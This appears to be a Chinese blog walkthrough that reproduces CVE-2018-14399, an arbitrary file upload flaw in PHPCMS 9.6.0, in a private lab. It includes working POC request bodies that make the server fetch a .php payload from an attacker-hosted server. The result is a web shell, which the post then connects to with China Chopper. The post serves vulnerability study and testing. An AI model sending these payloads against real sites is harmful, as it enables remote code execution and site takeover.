# phpcms v9.6.0任意文件上传漏洞(CVE-2018-14399) - 雨中落叶 - 博客园

> 原文：[https://www.cnblogs.com/yuzly/p/11394620.html](https://www.cnblogs.com/yuzly/p/11394620.html)

phpcms v9.6.0任意文件上传漏洞(CVE-2018-14399)

**一、漏洞描述**

PHPCMS 9.6.0版本中的libs/classes/attachment.class.php文件存在漏洞,该漏洞源于PHPCMS程序在下载远程/本地文件时没有对文件的类型做正确的校验。远程攻击者可以利用该漏洞上传并执行任意的PHP代码。

**二、漏洞影响版本**

PHPCMS 9.6.0

**三、漏洞环境搭建**

1、 官方下载phpcms v9.6.0版本,下载地址: [http://download.phpcms.cn/v9/9.6/](http://download.phpcms.cn/v9/9.6/)

2、 解压下载的文件,然后把文件放到phpstudy的网站根目录下,浏览器访问192.168.10.171/phpcms/install/install.php,开始安装

　　![](../Images/a8f307cd5df6ea1450b04e2f8c75e296.png)

3、一直点击下一步,在”选择模块”这个环节,选择”全新安装PHPCMS V9”

　　![](../Images/d0c9ccc40f62717ba3f3d32ee2f324de.png)

4、然后一直下一步,在”账号设置”这一块填写数据库账号和密码以及设置管理员密码

　　![](../Images/671d15bf3b777c1ac714b9d891928508.png)

5、然后一直下一步,直到出现如下界面,说面成功安装

　　![](../Images/ab036647da81e70d022661548092fb5b.png)

6、登录后台,生成首页

　　![](../Images/903847ff810be1e79b164238be5204b3.png)

**四、漏洞复现**

1、浏览器访问前台,注册一个会员

　　![](../Images/baa56e3895bc9449cb7fcf7270d09487.png)

2、点击注册页面,抓包

　　![](../Images/02846b7feff4cb2f7770037686fd2a82.png)

3、在另一个系统(kali),开启web服务,然后在web根目录下创建一个txt文件,写入如下信息

　　![](../Images/a9cf9856670dc69774e718080a8a9799.png)

4、构造POC

siteid=1&modelid=11&username=test2&password=test2123&email=test2@163.com&info[content]=<img src=http://192.168.10.153/phpinfo.txt?.php#.jpg>&dosubmit=1&protocol=

5、修改抓包内容,添加POC

　　![](../Images/7dc9d73e659487e42db6e0b985c10105.png)

6、可以看到返回包的内容包含了上传文件的路径

　　![](../Images/be655a54274910f8fad65fb1d00f3ffb.png)

7、浏览器访问

　　![](../Images/a8e704865a0aac61f024a3c28c002765.png)

8、构造POC,上传一句话

POC内容:

siteid=1&modelid=11&username=testa&password=testa123&email=testa@163.com&info[content]=<img src=http://192.168.10.153/test.txt?.php#.jpg>&dosubmit=1&protocol=

9、修改数据包,添加POC,需要注意: 在repeater里测试go时每一次都要修改username，password和email字段值,保证不能重复。

　　![](../Images/5108b5bdd7a7187919aa1a1978c21aa9.png)

10、可以看到返回包的内容包含了上传文件的路径

　　![](../Images/14b38ebd214f49cb02d9a1916695bdfb.png)

11、菜刀连接

　　![](../Images/6793929c21468e43ba5d743d82199b18.png)